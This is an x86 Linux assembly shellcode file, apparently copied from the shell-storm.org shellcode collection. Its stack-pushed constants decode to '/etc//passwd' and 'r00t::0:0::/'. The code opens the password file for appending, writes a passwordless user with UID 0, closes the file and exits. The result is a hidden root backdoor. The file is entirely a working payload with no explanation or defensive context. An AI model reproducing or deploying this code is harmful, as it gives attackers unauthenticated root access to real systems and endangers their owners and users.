; Source: http://shell-storm.org/shellcode/files/shellcode-211.php
global _start

section .text

_start:
  push byte +0x5
  pop eax
  xor ecx, ecx
  push ecx
  push dword 0x64777373
  push dword 0x61702f2f
  push dword 0x6374652f
  mov ebx, esp
  mov cx, 0x401
  int 0x80
  mov ebx, eax
  push byte +0x4
  pop eax
  xor edx, edx
  push edx
  push dword 0x2f3a3a30
  push dword 0x3a303a3a
  push dword 0x74303072
  mov ecx, esp
  push byte +0xc
  pop edx
  int 0x80
  push byte +0x6
  pop eax
  int 0x80
  push byte +0x1
  pop eax
  int 0x80
